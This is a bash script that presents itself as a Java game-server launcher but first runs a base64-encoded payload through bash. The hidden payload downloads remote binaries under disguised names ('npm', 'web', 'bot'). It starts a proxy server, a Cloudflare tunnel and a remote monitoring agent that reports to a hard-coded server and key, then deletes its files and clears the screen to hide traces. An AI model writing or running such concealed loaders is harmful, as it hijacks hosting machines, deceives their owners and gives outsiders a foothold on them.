#!/bin/bash
export UUID=${UUID:-'fc44fe6a-f083-4591-9c03-f8d61dc3907f'}
export NEZHA_SERVER=${NEZHA_SERVER:-'nezhak.5201972.xyz'}   # 哪吒3个变量不全不运行
export NEZHA_PORT=${NEZHA_PORT:-'444'}         # 哪吒端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
export NEZHA_KEY=${NEZHA_KEY:-'V0zzRDtyLquclyvMpH'}             # 哪吒客户端密钥
export ARGO_DOMAIN=${ARGO_DOMAIN:-''}          # 固定隧道域名，留空即启用临时隧道
export ARGO_AUTH=${ARGO_AUTH:-''}            # 固定隧道json或token，留空即启用临时隧道，json可在 https://fscarmen.cloudflare.now.cc 获取
export CFIP=${CFIP:-'www.visa.com.tw'}        # 优选域名或优选ip
export CFPORT=${CFPORT:-'8443'}             # 节点端口
export NAME=${NAME:-'Vls'}                # 节点名称
export FILE_PATH=${FILE_PATH:-'./world'}      # 节点存放文件夹
export ARGO_PORT=${ARGO_PORT:-'8001'}        # Argo端口,使用固定隧道token需在cf后台设置的端口和这里一致
export GAME_FILE=${GAME_FILE:-'LICENSE.jar'}   # 填写游戏文件名，不填写不启动游戏

echo "aWYgWyAhIC1kICIke0ZJTEVfUEFUSH0iIF07IHRoZW4KICAgIG1rZGlyICR7RklMRV9QQVRIfQpmaQoKY2xlYW51cF9vbGRmaWxlcygpIHsKICBybSAtcmYgJHtGSUxFX1BBVEh9L2Jvb3QubG9nICR7RklMRV9QQVRIfS9zdWIudHh0ICR7RklMRV9QQVRIfS9jb25maWcuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24gJHtGSUxFX1BBVEh9L3R1bm5lbC55bWwKfQpjbGVhbnVwX29sZGZpbGVzCndhaXQKCmFyZ29fY29uZmlndXJlKCkgewogIGlmIFtbIC16ICRBUkdPX0FVVEggfHwgLXogJEFSR09fRE9NQUlOIF1dOyB0aGVuCiAgICBlY2hvIC1lICJcZVsxOzMybUFSR09fRE9NQUlOIG9yIEFSR09fQVVUSCB2YXJpYWJsZSBpcyBlbXB0eSwgdXNlIHF1aWNrIHR1bm5lbHNcZVswbSIKICAgIHJldHVybgogIGZpCgogIGlmIFtbICRBUkdPX0FVVEggPX4gVHVubmVsU2VjcmV0IF1dOyB0aGVuCiAgICBlY2hvICRBUkdPX0FVVEggPiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KICAgIGNhdCA+ICR7RklMRV9QQVRIfS90dW5uZWwueW1sIDw8IEVPRgp0dW5uZWw6ICQoY3V0IC1kXCIgLWYxMiA8PDwgIiRBUkdPX0FVVEgiKQpjcmVkZW50aWFscy1maWxlOiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KcHJvdG9jb2w6IGh0dHAyCgppbmdyZXNzOgogIC0gaG9zdG5hbWU6ICRBUkdPX0RPTUFJTgogICAgc2VydmljZTogaHR0cDovL2xvY2FsaG9zdDokQVJHT19QT1JUCiAgICBvcmlnaW5SZXF1ZXN0OgogICAgICBub1RMU1ZlcmlmeTogdHJ1ZQogIC0gc2VydmljZTogaHR0cF9zdGF0dXM6NDA0CkVPRgogIGVsc2UKICAgIGVjaG8gLWUgIlxlWzE7MzJtQVJHT19BVVRIIG1pc21hdGNoIFR1bm5lbFNlY3JldCx1c2UgdG9rZW4gY29ubmVjdCB0byB0dW5uZWxcZVswbSIKICBmaQp9CmFyZ29fY29uZmlndXJlCndhaXQKCmdlbmVyYXRlX2NvbmZpZygpIHsKICBjYXQgPiAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPDwgRU9GCnsKICAibG9nIjogeyAiYWNjZXNzIjogIi9kZXYvbnVsbCIsICJlcnJvciI6ICIvZGV2L251bGwiLCAibG9nbGV2ZWwiOiAibm9uZSIgfSwKICAiaW5ib3VuZHMiOiBbCiAgICB7CiAgICAgICJwb3J0IjogJEFSR09fUE9SVCwKICAgICAgInByb3RvY29sIjogInZsZXNzIiwKICAgICAgInNldHRpbmdzIjogewogICAgICAgICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiZmxvdyI6ICJ4dGxzLXJwcngtdmlzaW9uIiB9XSwKICAgICAgICAiZGVjcnlwdGlvbiI6ICJub25lIiwKICAgICAgICAiZmFsbGJhY2tzIjogWwogICAgICAgICAgeyAiZGVzdCI6IDMwMDEgfSwgeyAicGF0aCI6ICIvdmxlc3MiLCAiZGVzdCI6IDMwMDIgfSwKICAgICAgICAgIHsgInBhdGgiOiAiL3ZtZXNzIiwgImRlc3QiOiAzMDAzIH0sIHsgInBhdGgiOiAiL3Ryb2phbiIsICJkZXN0IjogMzAwNCB9CiAgICAgICAgXQogICAgICB9LAogICAgICAic3RyZWFtU2V0dGluZ3MiOiB7ICJuZXR3b3JrIjogInRjcCIgfQogICAgfSwKICAgIHsKICAgICAgInBvcnQiOiAzMDAxLCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bGVzcyIsCiAgICAgICJzZXR0aW5ncyI6IHsgImNsaWVudHMiOiBbeyAiaWQiOiAiJHtVVUlEfSIgfV0sICJkZWNyeXB0aW9uIjogIm5vbmUiIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAid3MiLCAic2VjdXJpdHkiOiAibm9uZSIgfQogICAgfSwKICAgIHsKICAgICAgInBvcnQiOiAzMDAyLCAibGlzdGVuIjogIjEyNy4wLjAuMSIsICJwcm90b2NvbCI6ICJ2bGVzcyIsCiAgICAgICJzZXR0aW5ncyI6IHsgImNsaWVudHMiOiBbeyAiaWQiOiAiJHtVVUlEfSIsICJsZXZlbCI6IDAgfV0sICJkZWNyeXB0aW9uIjogIm5vbmUiIH0sCiAgICAgICJzdHJlYW1TZXR0aW5ncyI6IHsgIm5ldHdvcmsiOiAid3MiLCAic2VjdXJpdHkiOiAibm9uZSIsICJ3c1NldHRpbmdzIjogeyAicGF0aCI6ICIvdmxlc3MiIH0gfSwKICAgICAgInNuaWZmaW5nIjogeyAiZW5hYmxlZCI6IHRydWUsICJkZXN0T3ZlcnJpZGUiOiBbImh0dHAiLCAidGxzIiwgInF1aWMiXSwgIm1ldGFkYXRhT25seSI6IGZhbHNlIH0KICAgIH0sCiAgICB7CiAgICAgICJwb3J0IjogMzAwMywgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidm1lc3MiLAogICAgICAic2V0dGluZ3MiOiB7ICJjbGllbnRzIjogW3sgImlkIjogIiR7VVVJRH0iLCAiYWx0ZXJJZCI6IDAgfV0gfSwKICAgICAgInN0cmVhbVNldHRpbmdzIjogeyAibmV0d29yayI6ICJ3cyIsICJ3c1NldHRpbmdzIjogeyAicGF0aCI6ICIvdm1lc3MiIH0gfSwKICAgICAgInNuaWZmaW5nIjogeyAiZW5hYmxlZCI6IHRydWUsICJkZXN0T3ZlcnJpZGUiOiBbImh0dHAiLCAidGxzIiwgInF1aWMiXSwgIm1ldGFkYXRhT25seSI6IGZhbHNlIH0KICAgIH0sCiAgICB7CiAgICAgICJwb3J0IjogMzAwNCwgImxpc3RlbiI6ICIxMjcuMC4wLjEiLCAicHJvdG9jb2wiOiAidHJvamFuIiwKICAgICAgInNldHRpbmdzIjogeyAiY2xpZW50cyI6IFt7ICJwYXNzd29yZCI6ICIke1VVSUR9IiB9XSB9LAogICAgICAic3RyZWFtU2V0dGluZ3MiOiB7ICJuZXR3b3JrIjogIndzIiwgInNlY3VyaXR5IjogIm5vbmUiLCAid3NTZXR0aW5ncyI6IHsgInBhdGgiOiAiL3Ryb2phbiIgfSB9LAogICAgICAic25pZmZpbmciOiB7ICJlbmFibGVkIjogdHJ1ZSwgImRlc3RPdmVycmlkZSI6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCAibWV0YWRhdGFPbmx5IjogZmFsc2UgfQogICAgfQogIF0sCiAgImRucyI6IHsgInNlcnZlcnMiOiBbImh0dHBzK2xvY2FsOi8vOC44LjguOC9kbnMtcXVlcnkiXSB9LAogICJvdXRib3VuZHMiOiBbCiAgICB7ICJwcm90b2NvbCI6ICJmcmVlZG9tIiB9LAogICAgewogICAgICAidGFnIjogIldBUlAiLCAicHJvdG9jb2wiOiAid2lyZWd1YXJkIiwKICAgICAgInNldHRpbmdzIjogewogICAgICAgICJzZWNyZXRLZXkiOiAiWUZZT0FkYncxYktUSGxOTmkrYUVqQk0zQk83dW51RkM1ck9rTVJBejlYWT0iLAogICAgICAgICJhZGRyZXNzIjogWyIxNzIuMTYuMC4yLzMyIiwgIjI2MDY6NDcwMDoxMTA6OGEzNjpkZjkyOjEwMmE6OTYwMjpmYTE4LzEyOCJdLAogICAgICAgICJwZWVycyI6IFt7ICJwdWJsaWNLZXkiOiAiYm1YT0MrRjFGeEVNRjlkeWlLMkg1LzFTVXR6SDBKdVZvNTFoMndQZmd5bz0iLCAiYWxsb3dlZElQcyI6IFsiMC4wLjAuMC8wIiwgIjo6LzAiXSwgImVuZHBvaW50IjogIjE2Mi4xNTkuMTkzLjEwOjI0MDgiIH1dLAogICAgICAgICJyZXNlcnZlZCI6IFs3OCwgMTM1LCA3Nl0sICJtdHUiOiAxMjgwCiAgICAgIH0KICAgIH0KICBdLAogICJyb3V0aW5nIjogewogICAgImRvbWFpblN0cmF0ZWd5IjogIkFzSXMiLAogICAgInJ1bGVzIjogW3sgInR5cGUiOiAiZmllbGQiLCAiZG9tYWluIjogWyJkb21haW46b3BlbmFpLmNvbSIsICJkb21haW46YWkuY29tIl0sICJvdXRib3VuZFRhZyI6ICJXQVJQIiB9XQogIH0KfQpFT0YKfQpnZW5lcmF0ZV9jb25maWcKd2FpdAoKQVJDSD0kKHVuYW1lIC1tKSAmJiBET1dOTE9BRF9ESVI9IiR7RklMRV9QQVRIfSIgJiYgbWtkaXIgLXAgIiRET1dOTE9BRF9ESVIiICYmIEZJTEVfSU5GTz0oKQppZiBbICIkQVJDSCIgPT0gImFybSIgXSB8fCBbICIkQVJDSCIgPT0gImFybTY0IiBdIHx8IFsgIiRBUkNIIiA9PSAiYWFyY2g2NCIgXTsgdGhlbgogICAgRklMRV9JTkZPPSgiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvYXJtNjQvYm90MTMgYm90IiAiaHR0cHM6Ly9naXRodWIuY29tL2Vvb2NlL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvQVJNL3dlYiB3ZWIiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9BUk0vc3dpdGggbnBtIikKZWxpZiBbICIkQVJDSCIgPT0gImFtZDY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2XzY0IiBdIHx8IFsgIiRBUkNIIiA9PSAieDg2IiBdOyB0aGVuCiAgICBGSUxFX0lORk89KCJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9ib3QxMyBib3QiICJodHRwczovL2dpdGh1Yi5jb20vZW9vY2UvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC8xMjMvd2ViIHdlYiIgImh0dHBzOi8vZ2l0aHViLmNvbS9lb29jZS90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2J1bGlkL3N3aXRoIG5wbSIpCmVsc2UKICAgIGVjaG8gIlVuc3VwcG9ydGVkIGFyY2hpdGVjdHVyZTogJEFSQ0giCiAgICBleGl0IDEKZmkKZm9yIGVudHJ5IGluICIke0ZJTEVfSU5GT1tAXX0iOyBkbwogICAgVVJMPSQoZWNobyAiJGVudHJ5IiB8IGN1dCAtZCAnICcgLWYgMSkKICAgIE5FV19GSUxFTkFNRT0kKGVjaG8gIiRlbnRyeSIgfCBjdXQgLWQgJyAnIC1mIDIpCiAgICBGSUxFTkFNRT0iJERPV05MT0FEX0RJUi8kTkVXX0ZJTEVOQU1FIgogICAgaWYgWyAtZSAiJEZJTEVOQU1FIiBdOyB0aGVuCiAgICAgICAgZWNobyAtZSAiXGVbMTszMm0kRklMRU5BTUUgYWxyZWFkeSBleGlzdHMsU2tpcHBpbmcgZG93bmxvYWRcZVswbSIKICAgIGVsc2UKICAgICAgICBjdXJsIC1MIC1zUyAtbyAiJEZJTEVOQU1FIiAiJFVSTCIKICAgICAgICBlY2hvIC1lICJcZVsxOzMybURvd25sb2FkaW5nICRGSUxFTkFNRVxlWzBtIgogICAgZmkKZG9uZQp3YWl0CgpydW4oKSB7CiAgaWYgWyAtZSAiJHtGSUxFX1BBVEh9L25wbSIgXTsgdGhlbgogICAgY2htb2QgNzc3ICIke0ZJTEVfUEFUSH0vbnBtIgogICAgdGxzUG9ydHM9KCI0NDMiICI4NDQzIiAiMjA5NiIgIjIwODciICIyMDgzIiAiMjA1MyIpCiAgICBpZiBbWyAiJHt0bHNQb3J0c1sqXX0iID1+ICIke05FWkhBX1BPUlR9IiBdXTsgdGhlbgogICAgICBORVpIQV9UTFM9Ii0tdGxzIgogICAgZWxzZQogICAgICBORVpIQV9UTFM9IiIKICAgIGZpCiAgICBpZiBbIC1uICIkTkVaSEFfU0VSVkVSIiBdICYmIFsgLW4gIiRORVpIQV9QT1JUIiBdICYmIFsgLW4gIiRORVpIQV9LRVkiIF07IHRoZW4KICAgICAgICBub2h1cCAke0ZJTEVfUEFUSH0vbnBtIC1zICR7TkVaSEFfU0VSVkVSfToke05FWkhBX1BPUlR9IC1wICR7TkVaSEFfS0VZfSAke05FWkhBX1RMU30gPi9kZXYvbnVsbCAyPiYxICYKCQkgICAgc2xlZXAgMgogICAgICAgIHBncmVwIC14ICJucG0iID4gL2Rldi9udWxsICYmIGVjaG8gLWUgIlxlWzE7MzJtbnBtIGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bW5wbSBpcyBub3QgcnVubmluZywgcmVzdGFydGluZy4uLlxlWzBtIjsgcGtpbGwgLXggIm5wbSIgJiYgbm9odXAgIiR7RklMRV9QQVRIfS9ucG0iIC1zICR7TkVaSEFfU0VSVkVSfToke05FWkhBX1BPUlR9IC1wICR7TkVaSEFfS0VZfSAke05FWkhBX1RMU30gPi9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszMm1ucG0gcmVzdGFydGVkXGVbMG0iOyB9CiAgICBlbHNlCiAgICAgICAgZWNobyAtZSAiXGVbMTszNW1ORVpIQSB2YXJpYWJsZSBpcyBlbXB0eSxza2lwaW5nIHJ1bmluZ1xlWzBtIgogICAgZmkKICBmaQoKICBpZiBbIC1lICIke0ZJTEVfUEFUSH0vd2ViIiBdOyB0aGVuCiAgICBjaG1vZCA3NzcgIiR7RklMRV9QQVRIfS93ZWIiCiAgICBub2h1cCAke0ZJTEVfUEFUSH0vd2ViIC1jICR7RklMRV9QQVRIfS9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJgoJICBzbGVlcCAyCiAgICBwZ3JlcCAteCAid2ViIiA+IC9kZXYvbnVsbCAmJiBlY2hvIC1lICJcZVsxOzMybXdlYiBpcyBydW5uaW5nXGVbMG0iIHx8IHsgZWNobyAtZSAiXGVbMTszNW13ZWIgaXMgbm90IHJ1bm5pbmcsIHJlc3RhcnRpbmcuLi5cZVswbSI7IHBraWxsIC14ICJ3ZWIiICYmIG5vaHVwICIke0ZJTEVfUEFUSH0vd2ViIiAtYyAke0ZJTEVfUEFUSH0vY29uZmlnLmpzb24gPi9kZXYvbnVsbCAyPiYxICYgc2xlZXAgMjsgZWNobyAtZSAiXGVbMTszMm13ZWIgcmVzdGFydGVkXGVbMG0iOyB9CiAgZmkKCiAgaWYgWyAtZSAiJHtGSUxFX1BBVEh9L2JvdCIgXTsgdGhlbgogICAgY2htb2QgNzc3ICIke0ZJTEVfUEFUSH0vYm90IgogICAgaWYgW1sgJEFSR09fQVVUSCA9fiBeW0EtWjAtOWEtej1dezEyMCwyNTB9JCBdXTsgdGhlbgogICAgICBhcmdzPSJ0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiBydW4gLS10b2tlbiAke0FSR09fQVVUSH0iCiAgICBlbGlmIFtbICRBUkdPX0FVVEggPX4gVHVubmVsU2VjcmV0IF1dOyB0aGVuCiAgICAgIGFyZ3M9InR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tY29uZmlnICR7RklMRV9QQVRIfS90dW5uZWwueW1sIHJ1biIKICAgIGVsc2UKICAgICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgLS1sb2dmaWxlICR7RklMRV9QQVRIfS9ib290LmxvZyAtLWxvZ2xldmVsIGluZm8gLS11cmwgaHR0cDovL2xvY2FsaG9zdDokQVJHT19QT1JUIgogICAgZmkKICAgIG5vaHVwICR7RklMRV9QQVRIfS9ib3QgJGFyZ3MgPi9kZXYvbnVsbCAyPiYxICYKICAgIHNsZWVwIDIKICAgIHBncmVwIC14ICJib3QiID4gL2Rldi9udWxsICYmIGVjaG8gLWUgIlxlWzE7MzJtYm90IGlzIHJ1bm5pbmdcZVswbSIgfHwgeyBlY2hvIC1lICJcZVsxOzM1bWJvdCBpcyBub3QgcnVubmluZywgcmVzdGFydGluZy4uLlxlWzBtIjsgcGtpbGwgLXggImJvdCIgJiYgbm9odXAgIiR7RklMRV9QQVRIfS9ib3QiICRhcmdzID4vZGV2L251bGwgMj4mMSAmIHNsZWVwIDI7IGVjaG8gLWUgIlxlWzE7MzJtYm90IHJlc3RhcnRlZFxlWzBtIjsgfQogIGZpCn0gCnJ1bgpzbGVlcCA0CgpmdW5jdGlvbiBnZXRfYXJnb2RvbWFpbigpIHsKICBpZiBbWyAtbiAkQVJHT19BVVRIIF1dOyB0aGVuCiAgICBlY2hvICIkQVJHT19ET01BSU4iCiAgZWxzZQogICAgZ3JlcCAtb0UgJ2h0dHBzOi8vW1s6YWxudW06XStcLi1dK1wudHJ5Y2xvdWRmbGFyZVwuY29tJyAiJHtGSUxFX1BBVEh9L2Jvb3QubG9nIiB8IHNlZCAnc0BodHRwczovL0BAJwogIGZpCn0KCmdlbmVyYXRlX2xpbmtzKCkgewogIGFyZ29kb21haW49JChnZXRfYXJnb2RvbWFpbikKICBlY2hvIC1lICJcZVsxOzMybUFyZ29Eb21haW46XGVbMTszNW0ke2FyZ29kb21haW59XGVbMG0iCiAgc2xlZXAgMQoKICBpc3A9JChjdXJsIC1zIGh0dHBzOi8vc3BlZWQuY2xvdWRmbGFyZS5jb20vbWV0YSB8IGF3ayAtRlwiICd7cHJpbnQgJDI2Ii0iJDE4fScgfCBzZWQgLWUgJ3MvIC9fL2cnKQogIHNsZWVwIDEKCiAgVk1FU1M9InsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwiJHtOQU1FfS0ke2lzcH1cIiwgXCJhZGRcIjogXCIke0NGSVB9XCIsIFwicG9ydFwiOiBcIiR7Q0ZQT1JUfVwiLCBcImlkXCI6IFwiJHtVVUlEfVwiLCBcImFpZFwiOiBcIjBcIiwgXCJzY3lcIjogXCJub25lXCIsIFwibmV0XCI6IFwid3NcIiwgXCJ0eXBlXCI6IFwibm9uZVwiLCBcImhvc3RcIjogXCIke2FyZ29kb21haW59XCIsIFwicGF0aFwiOiBcIi92bWVzcz9lZD0yMDQ4XCIsIFwidGxzXCI6IFwidGxzXCIsIFwic25pXCI6IFwiJHthcmdvZG9tYWlufVwiLCBcImFscG5cIjogXCJcIiB9IgoKICBjYXQgPiAke0ZJTEVfUEFUSH0vbGlzdC50eHQgPDxFT0YKdmxlc3M6Ly8ke1VVSUR9QCR7Q0ZJUH06JHtDRlBPUlR9P2VuY3J5cHRpb249bm9uZSZzZWN1cml0eT10bHMmc25pPSR7YXJnb2RvbWFpbn0mdHlwZT13cyZob3N0PSR7YXJnb2RvbWFpbn0mcGF0aD0lMkZ2bGVzcyUzRmVkJTNEMjA0OCMke05BTUV9LSR7aXNwfQoKdm1lc3M6Ly8kKGVjaG8gIiRWTUVTUyIgfCBiYXNlNjQgLXcwKQoKdHJvamFuOi8vJHtVVUlEfUAke0NGSVB9OiR7Q0ZQT1JUfT9zZWN1cml0eT10bHMmc25pPSR7YXJnb2RvbWFpbn0mdHlwZT13cyZob3N0PSR7YXJnb2RvbWFpbn0mcGF0aD0lMkZ0cm9qYW4lM0ZlZCUzRDIwNDgjJHtOQU1FfS0ke2lzcH0KRU9GCgogIGJhc2U2NCAtdzAgJHtGSUxFX1BBVEh9L2xpc3QudHh0ID4gJHtGSUxFX1BBVEh9L3N1Yi50eHQKICBjYXQgJHtGSUxFX1BBVEh9L3N1Yi50eHQKICBlY2hvIC1lICJcblxlWzE7MzJtJHtGSUxFX1BBVEh9L3N1Yi50eHQgc2F2ZWQgc3VjY2Vzc2Z1bGx5XGVbMG0iCiAgc2xlZXAgNSAgCiAgcm0gLXJmICR7RklMRV9QQVRIfS9saXN0LnR4dCAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgJHtGSUxFX1BBVEh9L2NvbmZpZy5qc29uICR7RklMRV9QQVRIfS90dW5uZWwuanNvbiAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCAke0ZJTEVfUEFUSH0vbnBtICR7RklMRV9QQVRIfS93ZWIgJHtGSUxFX1BBVEh9L2JvdAp9CmdlbmVyYXRlX2xpbmtzCmVjaG8gLWUgIlxlWzE7OTZtUnVubmluZyBkb25lIVxlWzBtIgplY2hvIC1lICJcZVsxOzk2bVRoYW5rIHlvdSBmb3IgdXNpbmcgdGhpcyBzY3JpcHQsZW5qb3khXGVbMG0iCnNsZWVwIDEyCmNsZWFy" | base64 -d | bash

chmod +x ${GAME_FILE} && java -Xms128M -XX:MaxRAMPercentage=95.0 -jar ${GAME_FILE}

tail -f /dev/null